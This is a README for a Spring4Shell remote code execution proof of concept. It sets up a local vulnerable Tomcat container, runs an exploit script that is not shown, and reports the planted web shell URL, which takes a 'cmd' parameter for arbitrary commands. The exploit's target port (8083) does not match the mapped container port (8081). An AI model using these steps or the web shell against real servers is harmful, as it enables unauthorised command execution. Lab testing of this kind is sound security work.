# Spring4shell RCE vulnerability

Description TBD

![](./screenshot.png)

# POC

* Build the docker image

```
docker build . -t springshell-rce-poc
```

* Run the docker container

```
docker run --rm -p 8081:8080 --name springshell-rce-poc springshell-rce-poc
```


* Running the exploit

```
python exploit-poc.py --url "http://127.0.0.1:8083/"
```
The expected response

```
exploiting
Shell URL:http://127.0.0.1:8081/tomcatwar.jsp?pwd=j&cmd=whoami
```

If you accessed this url, it will run whatever command you want `cmd=<whatyouwant>`

![](./exploit.png)

If you ssh the container you will see a new file has been created `tomcatwar.jsp`

```
docker exec -it springshell-rce-poc /bin/bash
ls /usr/local/tomcat/webapps/ROOT
```